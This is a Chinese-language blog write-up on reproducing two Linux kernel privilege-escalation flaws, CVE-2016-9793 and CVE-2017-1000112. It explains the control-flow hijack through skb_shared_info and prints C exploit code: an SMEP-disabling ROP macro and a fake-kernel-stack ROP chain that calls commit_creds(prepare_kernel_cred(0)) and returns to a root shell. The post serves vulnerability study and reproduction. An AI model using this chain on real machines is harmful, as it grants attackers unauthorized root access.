# CVE-2016-9793与CVE-2017-1000112复现学习

### 背景

近期工作中需要对一些已知的内核提权漏洞进行复现和有效性测试，因此对一些有cve编号的内核提权漏洞进行了学习。参考xairy大神的repo，逐一研究这些漏洞的利用过程。

其中，大神的两个漏洞CVE-2016-9793和CVE-2017-1000112，漏洞利用的原理和过程非常相似。在这里对复现过程进行简单的记录和思考。

### 技术细节

CVE-2016-9793是一个内核socket模块中的整形溢出漏洞，主要细节在于使用SO_SNDBUFFORCE标签对sk_sndbuf进行赋值时，可以使用u32变量来溢出int32整形变量。
当传入一个非法的值0xffffff00时，内核对该非法输入进行了一系列错误操作，导致最后内核会引用一个用户空间可控的skb_shared_info对象指针。攻击者通过在用户空间mmap到对应的对象指针地址，并为shinfo->destructor_arg这个变量赋值来控制PC指针的跳转，从而完成控制流的获取。

CVE-2017-1000112是一个内核越界写漏洞，攻击者通过构造一个恶意UFO packet来诱使skb_copy_and_csum_bits()函数执行越界写操作，从而获取一个可控的skb_shared_info对象。同理，利用shinfo->destructor_arg这个变量来劫持kernel的控制流，达到权限提升的目的。

### 漏洞利用

在利用这两个漏洞的过程中，利用点是一致的，都是使用一个可控的shinfo->destructor_arg变量来获取控制流。但是即使能够完成对内核PC指针的控制，还是要继续绕过KASLR和SMEP等缓解措施。

xairy大神在原始的POC代码中，提供了一个Disable SMEP的ROP chain。但是在实际运行过程中，这个Disable过程好像并没有起作用，内核仍然限制运行用户空间地址的代码。

{% highlight c %}
#define SMEP_MASK 0x100000

#define CHAIN_DISABLE_SMEP			\
	*stack++ = MOV_RAX_CR4_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = POP_RCX_RET;			\
	*stack++ = SMEP_MASK;			\
	*stack++ = OR_RAX_RCX_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = XCHG_EAX_EDI_RET;		\
	*stack++ = MOV_CR4_RDI_RET;
{% endhighlight %}

这里面的问题可能需要继续调试，确认控制寄存器CR4的值是否确实被改写了。这个问题留到后面去研究，正好之前学习了kernel rop的利用链，所以我这里直接放弃了改写CR4，而是直接构造一个虚假的内核stack来执行kernel rop。

以CVE-2017-1000112的POC代码为例，构造一个fake kernel stack来执行kernel rop的利用代码如下：

{% highlight c %}


void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);
    /*
	CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;
    */
    void* temp_stack;
	assert((temp_stack = mmap((void*)0x30000000, 0x40000, 7, 0x32, 0, 0)) == (void*)0x30000000);

    save_state();
	*stack ++= POP_RDI_RET; /* pop %rdi; ret */

	stack = (uint64_t*)((char*)stack_aligned + stack_offset + 8 + 0x144);

	*stack ++= 0x0UL;                /* NULL */
	*stack ++= PREPARE_KERNEL_CRED; /* prepare_kernel_cred() */

	*stack ++= POP_RDX_RET; /* pop %rdx; ret */
	*stack ++= COMMIT_CREDS; // commit_creds() + 2 instructions

	*stack ++= MOV_RDI_RAX_CALL_RDX; /* mov %rax, %rdi; call %rdx */

    *stack ++= SWAPGS_POP_RBP_RET; // swapgs ; pop rbp ; ret
    *stack ++= 0xdeadbeefUL;         // dummy placeholder

	*stack ++= IRETQ; /* iretq */
	*stack ++= (uint64_t)shell; /* spawn a shell */
	*stack ++= user_cs;              /* saved CS */
	*stack ++= user_rflags;          /* saved EFLAGS */
	*stack ++= (uint64_t)(temp_stack+0x20000);  /* mmaped stack region in user space */
    *stack ++= user_ss;              /* saved SS */

}


{% endhighlight %}

改写后的POC即使没有关闭SMEP保护，但是仍然能完成后续的权限提升操作，运行效果如下图所示：
![cve-2017-1000112](http://7xwdx7.com1.z0.glb.clouddn.com/exp-cve-2017-1000112.png)
